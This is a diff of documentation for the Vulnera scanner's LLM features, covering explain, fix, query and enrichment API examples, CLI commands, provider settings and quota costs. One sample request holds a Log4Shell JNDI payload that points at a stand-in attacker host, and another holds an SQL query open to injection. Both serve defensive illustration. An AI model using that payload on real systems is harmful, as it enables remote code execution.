@@ -1,212 +1,226 @@
-# AI-Powered Explanations & Fixes (LLM-Based)
+# LLM Features (Explanations, Fixes, Queries)
 
-Vulnera goes beyond vulnerability detection. Get instant, human-readable explanations and AI-generated code fixes using LLM-powered analysis.
+Vulnera’s LLM features are **post-processing only**. Detection is performed by SAST, Secrets, API Security, and Dependency Analysis modules; LLMs are used to **explain** findings and **propose fixes** after the scan. LLM calls require network access and valid provider credentials.
 
-## What Is LLM-Based Analysis?
+---
 
-LLM (Large Language Model) features use advanced AI—specifically **Google Gemini**—to provide:
+## What’s Available
 
-- **Vulnerability Explanations** — Why a finding matters and what risks it poses
-- **Code Fix Suggestions** — Concrete code snippets showing how to remediate the issue
-- **Natural Language Queries** — Ask security questions in plain English
-- **Context-Aware Insights** — AI understands your specific code, language, and framework
+### 1) Explain a Vulnerability (API)
 
-LLM features are **separate from core detection**. Detection modules (secrets, SAST, API, deps) are rule-based and work offline. LLM features enhance findings after analysis.
+Endpoint:
 
-## Key Features
+- `POST /api/v1/llm/explain`
 
-### 1. Vulnerability Explanations
+Request (example):
 
-**Get AI-powered explanations for every finding.**
-
-```bash
-# CLI example
-vulnera analyze /path/to/project --format json | jq '.findings[] | .llm_explanation'
+```/dev/null/request.json#L1-6
+{
+  "vulnerability_id": "CVE-2021-44228",
+  "description": "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP endpoints.",
+  "affected_component": "org.apache.logging.log4j:log4j-core",
+  "audience": "technical"
+}
 ```
 
-**Response (streaming):**
+Response (example):
 
-```
-A SQL injection vulnerability occurs when user input is directly concatenated
-into SQL queries without proper parameterization. An attacker can inject
-malicious SQL code to bypass authentication, extract data, or modify the database.
-
-To fix: Use parameterized queries or prepared statements with placeholder
-values instead of string concatenation.
-```
-
-### 2. AI-Generated Code Fixes
-
-**Get actionable remediation code.**
-
-```bash
-# CLI example with code context
-vulnera analyze /path/to/project --enhance-with-fixes
+```/dev/null/response.json#L1-8
+{
+  "explanation": "This vulnerability allows remote code execution because ...",
+  "key_points": ["Remote Code Execution", "JNDI Injection", "Critical Severity"],
+  "mitigation_steps": ["Upgrade to version 2.15.0", "Disable JNDI lookup"]
+}
 ```
 
-**Response:**
+---
 
-```python
-# Fixed code using proper escaping
-from flask import escape
-html = f"<div>{escape(user_input)}</div>"
+### 2) Generate a Code Fix (API)
 
-# Or use Jinja2 templating (recommended)
-# {{ user_input }} is automatically escaped in templates
+Endpoint:
+
+- `POST /api/v1/llm/fix`
+
+Request (example):
+
+```/dev/null/request.json#L1-6
+{
+  "vulnerability_id": "CVE-2021-44228",
+  "vulnerable_code": "logger.error(\"${jndi:ldap://attacker.com/a}\");",
+  "language": "java",
+  "context": "src/main/java/com/example/App.java"
+}
 ```
 
-### 3. Natural Language Queries
+Response (example):
 
-**Ask security questions in plain English.**
-
-```bash
-vulnera llm query "How do I securely store API keys in my Node.js application?"
+```/dev/null/response.json#L1-6
+{
+  "fixed_code": "logger.error(\"User input: {}\", sanitizedInput);",
+  "explanation": "Replaced direct string concatenation with parameterized logging.",
+  "confidence": 0.95
+}
 ```
 
-**Response:**
+---
 
-```
-Based on your analysis results:
+### 3) Natural Language Query (API)
 
-1. Outdated Express.js (3.x) - Use 4.18+ for security patches
-2. Unvalidated user input in route handlers - Add input validation middleware
-3. Hardcoded API keys in .env - Use environment-based configuration instead
+Endpoint:
 
-For detailed remediation steps, run: vulnera llm fix --issue [issue_id]
-```
+- `POST /api/v1/llm/query`
 
-## Cost & Quota Considerations
+Request (example):
 
-LLM requests consume **6x quota tokens** compared to standard analysis (3x tokens).
-
-### Rate Limiting & Costs
-
-| Account Tier        | Daily Limit                  | LLM Requests/Day | Cost per Request     |
-| ------------------- | ---------------------------- | ---------------- | -------------------- |
-| Unauthenticated     | 10 requests/day              | Limited          | 6 tokens per request |
-| API Key             | 40 requests/day              | ~6-7 requests    | 6 tokens per request |
-| Organization Member | 48 requests/day (+20% bonus) | ~8 requests      | 6 tokens per request |
-
-with organization accounts, team members share a combined quota.
-with plan to expand limits in future as we expand our infrastructure.
-
-### Cost Weighting Explained
-
-- **Detection (GET)**: 1 token
-- **Analysis (POST)**: 3 tokens
-- **LLM Operations (explain/fix/query)**: 6 tokens
-- **LLM Enrichment (batch explanations)**: 6 tokens per finding
-
-**Example: API Cost**
-
-```
-Analyzing a project with 5 findings:
-- Dependency analysis: 3 tokens
-- SAST analysis: 3 tokens
-- Secret detection: 3 tokens
-- 5 LLM explanations: 5 × 6 = 30 tokens
-- Total: 39 tokens (one large request)
-
-With 40 token/day API key quota, this consumes ~97% of daily limit.
+```/dev/null/request.json#L1-4
+{
+  "query": "How do I fix the SQL injection in login.php?",
+  "context": { "file": "login.php", "content": "..." }
+}
 ```
 
-### Quota Estimation
+Response (example):
 
-**For individual developers:**
-
-- Run analysis: 3 tokens
-- Get explanations: 6 tokens per finding (avg 3-5 findings) = 18-30 tokens
-- Occasional code fixes: 6 tokens
-- **Daily budget: ~40-50 tokens = good for 1-2 full analyses with LLM enhancement**
-
-**For teams:**
-
-- Create organization for shared quota (4x-8x multiplier)
-- Team members share daily budget
-- Quota resets at UTC midnight
-
-## Using LLM Features
-
-### CLI: Enhance Findings with Explanations
-
-```bash
-# Get explanations for all findings
-vulnera analyze /path/to/project --enhance-with-explanations
-
-# Or pipe to jq for specific findings
-vulnera analyze /path/to/project --format json \
-  | jq '.findings[0] | @json' \
-  | vulnera llm explain
+```/dev/null/response.json#L1-4
+{
+  "answer": "Use prepared statements and parameterized queries...",
+  "references": ["https://owasp.org/www-community/attacks/SQL_Injection"]
+}
 ```
 
-## Enabling/Disabling LLM Features
+---
 
-### Environment Variables
+### 4) Enrich Job Findings (API)
 
-```bash
-# Enable LLM
-export VULNERA_LLM_ENABLED=true
-export VULNERA_LLM_PROVIDER=gemini
-export VULNERA_LLM_GEMINI_API_KEY=your_key_here
+Endpoint:
 
-# Use in CLI
-vulnera analyze /path/to/project --enhance-with-explanations
+- `POST /api/v1/jobs/{job_id}/enrich`
+
+Request (example):
+
+```/dev/null/request.json#L1-6
+{
+  "finding_ids": ["finding_123", "finding_456"],
+  "code_contexts": {
+    "finding_123": "def login(user, password):\n    query = f\"SELECT * FROM users WHERE user='{user}'\""
+  }
+}
 ```
 
-## Best Practices
+Response (example):
 
-### 1. Use LLM for High-Severity Findings
-
-```bash
-# Only enhance critical/high severity findings to save quota
-vulnera analyze /path/to/project \
-  --enhance-with-fixes \
-  --severity high
+```/dev/null/response.json#L1-8
+{
+  "job_id": "550e8400-e29b-41d4-a716-446655440000",
+  "enriched_count": 5,
+  "failed_count": 1,
+  "findings": [
+    { "id": "finding_123", "severity": "Critical", "description": "SQL Injection...", "location": "src/auth.py:42:10", "explanation": "...", "remediation_suggestion": "Use parameterized queries..." }
+  ]
+}
 ```
 
-### 2. Batch Enrich Results
+---
 
-Instead of individual LLM calls, enrich entire job results.
+## CLI Support
 
-### 3. Cache Explanations
+### Generate a Fix (CLI)
 
-Vulnera caches LLM explanations for duplicate findings. Same vulnerability ID = cached response.
+Command:
 
-### 4. Use Natural Language Queries for Discovery
+- `vulnera generate-fix`
 
-```bash
-# Ask about vulnerabilities you don't understand
-vulnera llm query "What is YAML injection and why is it dangerous?"
+Usage:
+
+```/dev/null/commands.txt#L1-4
+vulnera generate-fix \
+  --vulnerability CVE-2021-44228 \
+  --code src/main/java/com/example/App.java \
+  --line 42
 ```
 
-## Comparison: Detection vs LLM Features
+Notes:
 
-| Aspect       | Detection Modules           | LLM Features                  |
-| ------------ | --------------------------- | ----------------------------- |
-| **Method**   | Rule-based, ML models       | LLM (Google Gemini)           |
-| **Offline**  | ✅ Yes (SAST, secrets, API) | ❌ Requires network           |
-| **Cost**     | 3 tokens                    | 6 tokens                      |
-| **Use Case** | Find vulnerabilities        | Understand & remediate        |
-| **Speed**    | Instant                     | 1-5 seconds                   |
-| **Accuracy** | High (rules + patterns)     | Context-aware, conversational |
+- Requires online mode, authentication, and available quota.
+- If offline, unauthenticated, or quota exceeded, the command exits with an error code.
+
+### Bulk SAST Fix Suggestions (CLI)
+
+Command:
+
+- `vulnera sast --fix`
+
+Usage:
+
+```/dev/null/commands.txt#L1-2
+vulnera sast . --fix
+```
+
+Notes:
+
+- Runs SAST locally, then uses the server for LLM-powered fix suggestions.
+- Requires online mode and authentication.
+
+---
+
+## Provider Configuration
+
+LLM providers are configured via `vulnera_core::config::LlmConfig` and environment variables.
+
+### Provider Selection
+
+- `VULNERA__LLM__PROVIDER` = `google_ai` | `openai` | `azure`
+- `VULNERA__LLM__DEFAULT_MODEL`
+- `VULNERA__LLM__TEMPERATURE`
+- `VULNERA__LLM__MAX_TOKENS`
+- `VULNERA__LLM__TIMEOUT_SECONDS`
+- `VULNERA__LLM__ENABLE_STREAMING`
+
+### Google AI (Gemini)
+
+- `GOOGLE_AI_KEY`
+- `VULNERA__LLM__GOOGLE_AI__BASE_URL`
+
+### OpenAI
+
+- `OPENAI_API_KEY`
+- `VULNERA__LLM__OPENAI__BASE_URL`
+- `VULNERA__LLM__OPENAI__ORGANIZATION_ID`
+
+### Azure OpenAI
+
+- `AZURE_OPENAI_KEY`
+- `VULNERA__LLM__AZURE__ENDPOINT`
+- `VULNERA__LLM__AZURE__DEPLOYMENT`
+- `VULNERA__LLM__AZURE__API_VERSION`
+
+---
+
+## Quota and Cost
+
+LLM operations are higher-cost than standard analysis:
+
+- **Analysis**: 3 tokens
+- **LLM (explain/fix/query)**: 6 tokens
+
+Use LLM sparingly for high-severity findings, and prefer batch enrichment for efficiency.
+
+---
 
 ## Troubleshooting
 
-**Q: LLM requests are slow**
-A: LLM processing takes 1-5 seconds. For bulk analysis, use batch enrichment API instead of individual requests.
+**LLM requests fail in offline mode**
+LLM requires network access. Remove `--offline` and ensure the server is reachable.
 
-**Q: Getting quota exceeded errors with LLM enabled**
-A: LLM costs 6x regular analysis. Reduce LLM usage or upgrade your plan. See [Quota & Pricing](quota-pricing.md).
+**Authentication required**
+Run `vulnera auth login` or set `VULNERA_API_KEY`.
 
-**Q: LLM explanations seem generic**
-A: Provide code context in your request. More context = better explanations. See examples above.
+**Quota exceeded**
+Check `vulnera quota` and reduce LLM usage or wait for reset.
 
-**Q: Can I use LLM offline?**
-A: No—LLM features require network. Use offline-only analysis modules (SAST, secrets, API) for local scanning.
+---
 
 ## Next Steps
 
-- [Configure LLM settings](configuration.md) for your environment
-- [Understand quota & costs](quota-pricing.md)
-- [Explore natural language queries](llm-queries.md)
-- [Learn about code fix generation](llm-code-fixes.md)
+- [Quota & Pricing](quota-pricing.md)
+- [Configuration Reference](../reference/configuration.md)
